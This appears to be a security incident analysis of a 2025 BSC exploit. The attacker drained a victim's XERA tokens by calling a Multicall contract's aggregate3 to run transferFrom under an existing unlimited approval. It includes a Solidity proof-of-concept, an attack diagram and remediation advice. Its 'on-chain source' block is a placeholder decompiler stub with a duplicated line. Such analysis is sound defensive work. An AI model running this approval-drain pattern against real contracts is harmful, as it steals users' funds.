# MulticallWithXera — Multicall Approval Abuse Analysis

| Field | Details |
|------|------|
| **Date** | 2025-08-13 |
| **Protocol** | MulticallWithXera (Xera Finance) |
| **Chain** | BSC |
| **Loss** | ~17,000 USD |
| **Attacker** | [0x00b700b9da0053009cb84400ed1e8fe251002af3](https://bscscan.com/address/0x00b700b9da0053009cb84400ed1e8fe251002af3) |
| **Attack Tx** | [0xed6fd61c...](https://bscscan.com/tx/0xed6fd61c1eb2858a1594616ddebaa414ad3b732dcdb26ac7833b46803c5c18db) |
| **Vulnerable Contract** | [0x90be00229fe8000000009e007743a485d400c3b7](https://bscscan.com/address/0x90be00229fe8000000009e007743a485d400c3b7) |
| **Root Cause** | Attacker exploited the unlimited approval a victim had granted to the Multicall contract via the `aggregate3` function |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-08/MulticallWithXera_exp.sol) |

---

## 1. Vulnerability Overview

A Xera Finance user (victim) had granted an unlimited approval for XERA tokens to the Multicall contract (`0x90be...`). The attacker exploited this by calling the `aggregate3` function on the Multicall contract to execute a `transferFrom` on the victim's XERA tokens, stealing approximately 17,000 USD worth of assets.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: Multicall executes arbitrary calls in its own msg.sender context
// Multicall contract (0x90be...)
function aggregate3(Call3[] calldata calls) external payable returns (Result[] memory returnData) {
    // Executes each call where this contract is the approved spender
    // If attacker injects transferFrom into calls, it will execute
    for (uint256 i = 0; i < calls.length; i++) {
        (bool success, bytes memory ret) = calls[i].target.call(calls[i].callData);
        ...
    }
}

// Victim had previously approved:
// XERA.approve(Multicall, type(uint256).max)

// ✅ Remediation: Design the system so users do not grant unlimited approvals to Multicall
// Or restrict Multicall to only execute specific function selectors
```

### On-chain Source Code

Source: Sourcify verified

```solidity
// File: MulticallWithXera_decompiled.sol
contract MulticallWithXera {
contract MulticallWithXera {  // ❌ Vulnerability

    // Selector: 0x988d2560
    function unknownFn_988d2560() external  {
        // TODO: decompile logic not implemented
    }

    // Selector: 0xefd1fc6a
    function unknownFn_efd1fc6a() external  {
        // TODO: decompile logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Confirms that the victim's address has granted
  │         unlimited XERA token approval to the Multicall contract
  │         (approval was previously granted during normal usage)
  │
  ├─[2]─▶ Calls aggregate3
  │         calls[0] = {
  │           target: XERA_TOKEN,
  │           callData: transferFrom(victim, attacker, balance)
  │         }
  │
  ├─[3]─▶ Multicall executes XERA.transferFrom(victim, attacker, ...)
  │         └─ Multicall = approved spender → succeeds
  │
  └─[4]─▶ XERA tokens drained
              └─ Swapped to BNB via CakeLP
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public balanceLog {
    // [1] Confirm victim has approved the Multicall contract for XERA tokens
    // XERA.allowance(victim, multicall) > 0

    // [2] Construct malicious calls array for aggregate3
    IMulticall.Call3[] memory calls = new IMulticall.Call3[](1);
    calls[0] = IMulticall.Call3({
        target: xera,  // XERA token contract
        allowFailure: false,
        // Encode transferFrom(victim, attacker, victim_balance)
        callData: abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            victim,          // from: victim
            address(this),   // to: attacker
            IERC20(xera).balanceOf(victim)  // full balance
        )
    });

    // [3] Execute Multicall.aggregate3
    // Multicall is the approved spender for XERA, so transferFrom succeeds
    IMulticall(multicall).aggregate3(calls);

    // [4] Swap stolen XERA to WBNB via CakeLP
    // ...
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Approval Abuse via Multicall |
| **Attack Vector** | Existing token approval + Multicall aggregate3 |
| **Impact** | Full drain of approved token balance |
| **CWE** | CWE-284: Improper Access Control |
| **DASP Classification** | Access Control / Approval Exploit |

## 6. Remediation Recommendations

1. **Avoid Unlimited Approvals**: Design the UI/UX so users only approve the minimum amount required by the protocol.
2. **Isolate Multicall Permissions**: Architect the system so the Multicall contract does not hold token transfer permissions.
3. **Use EIP-2612 Permit**: Handle approve+transfer in a single transaction to eliminate persistent standing approvals.
4. **Approval Monitoring**: Guide users to periodically revoke unused approvals.

## 7. Lessons Learned

- Granting token approvals to a Multicall contract means anyone can transfer tokens through that contract.
- The "infinite approval" pattern leads to total loss of user funds if the protocol is hacked or abused.
- Minimizing the scope of user approvals is a critical security principle in protocol design.